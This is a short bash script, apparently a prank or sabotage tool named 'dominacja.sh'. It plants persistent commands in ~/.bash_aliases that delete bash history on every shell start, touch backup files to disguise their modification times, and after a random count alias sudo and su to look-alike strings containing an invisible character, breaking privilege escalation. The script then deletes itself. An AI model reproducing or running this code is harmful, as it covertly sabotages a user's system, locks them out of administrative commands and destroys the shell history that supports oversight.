echo "####################################"
echo "Don't forget to clear your browsing history!"
echo "####################################"

# Name Of Folder with backups in home directory, change if needed (this folder needs to exist!)
Backups="Dokumenty"

# Backup .bashrc
rm -f ~/$Backups/.bashrc
cp -b  ~/.bashrc ~/$Backups/.bashrc

# Clear Bash History On Every Console Start
echo 'rm -f ~/.bash_history' >> ~/.bash_aliases

# Change Modification times of backups on console start
echo "cp -b  ~/$Backups/.bashrc ~/$Backups/.bashrcc" >> ~/.bash_aliases
echo "rm -f ~/$Backups/.bashrc" >> ~/.bash_aliases
echo "cp -b  ~/$Backups/.bashrcc ~/$Backups/.bashrc" >> ~/.bash_aliases
echo "rm -f ~/$Backups/.bashrcc" >> ~/.bash_aliases

echo "cp -b  ~/$Backups/.bash_aliases ~/$Backups/.bash_aliasess" >> ~/.bash_aliases
echo "rm -f ~/$Backups/.bash_aliases" >> ~/.bash_aliases
echo "cp -b  ~/$Backups/.bash_aliasess ~/$Backups/.bash_aliases" >> ~/.bash_aliases
echo "rm -f ~/$Backups/.bash_aliasess" >> ~/.bash_aliases

# Start Counting
echo 'LOL=0 ' >> ~/.bash_aliases

# Clone script on every console execution
# For Fourth (Or Later) User sudo and su will stop working
echo "echo 'if [ \$LOL -gt \$((2+\$RANDOM%10)) ]' >> ~/.bash_aliases" >> ~/.bash_aliases
echo "echo 'then' >> ~/.bash_aliases" >> ~/.bash_aliases
echo "echo 'alias sudo=sud‎o' >> ~/.bash_aliases" >> ~/.bash_aliases
echo "echo 'alias su=s‎u' >> ~/.bash_aliases" >> ~/.bash_aliases
# Absolute Domination
echo "echo 'rm -f ~/.bashrc' >> ~/.bash_aliases" >> ~/.bash_aliases
echo "echo 'cp -b ~/$Backups/.bashrc ~/.bashrc' >> ~/.bash_aliases" >> ~/.bash_aliases
echo "echo 'echo \"alias sudo=sud‎o\" >> ~/.bashrc' >> ~/.bash_aliases" >> ~/.bash_aliases
echo "echo 'echo \"alias su=s‎u\" >> ~/.bashrc' >> ~/.bash_aliases" >> ~/.bash_aliases
# Reset Count
echo "echo 'rm -f ~/.bash_aliases' >> ~/.bash_aliases" >> ~/.bash_aliases
echo "echo 'cp -b ~/$Backups/.bash_aliases ~/.bash_aliases' >> ~/.bash_aliases" >> ~/.bash_aliases
# End If
echo "echo 'fi' >> ~/.bash_aliases" >> ~/.bash_aliases
# Increase Count
echo "echo 'LOL=\$((\$LOL+1))' >> ~/.bash_aliases" >> ~/.bash_aliases

#Backup Executor
rm -f ~/$Backups/.bash_aliases
cp -b  ~/.bash_aliases ~/$Backups/.bash_aliases



#Auto Destruction
rm dominacja.sh

